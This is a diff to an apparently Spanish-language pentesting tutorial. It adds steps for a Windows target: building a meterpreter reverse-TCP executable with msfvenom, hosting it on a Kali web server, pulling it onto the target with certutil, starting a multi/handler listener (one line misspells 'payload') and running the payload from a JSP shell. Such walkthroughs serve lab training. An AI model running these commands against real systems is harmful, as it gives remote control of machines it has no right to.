@@ -30,6 +30,18 @@ Primero creamos el payload con `msfvenom:`
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> LPORT=<puerto> -f exe -o meterpreter.exe
 ```
 
-Ahora necesitamos transferir el payload al servidor. Puesto que en principio no contamos con una forma de transferir archivos, podemos crear un servidor web en nuestra máquina kali
+Ahora necesitamos transferir el payload al servidor. Puesto que en principio no contamos con una forma de transferir archivos, podemos crear un servidor web en nuestra máquina kali con `python -m SimpleHTTPServer 80`. Una vez creado el servidor web, podemos conectarnos a la shell más básica que hemos obtenido antes y descargar el payload con `certutil -urlcache -f http://ip_kali/meterpreter.exe meterpreter.exe`
+
+El siguiente paso es crear un listener `multi/handler`. Podemos ejecutarlo manualmente en msfconsole o crear un `script.rc`:
+
+```bash
+use multi/handler
+set payloat windows/meterpreter/reverse_tcp
+set lhost ip_kali
+set lport port_kali
+run
+```
+
+Para ejecutar el script usamos la orden `msfconsole -r script.rc`. Por último, ejecutamos el payload desde la shell jsp con `.\meterpreter.exe`
 
 [⟵ Anterior](../05_sistema.md#explotación-windows)
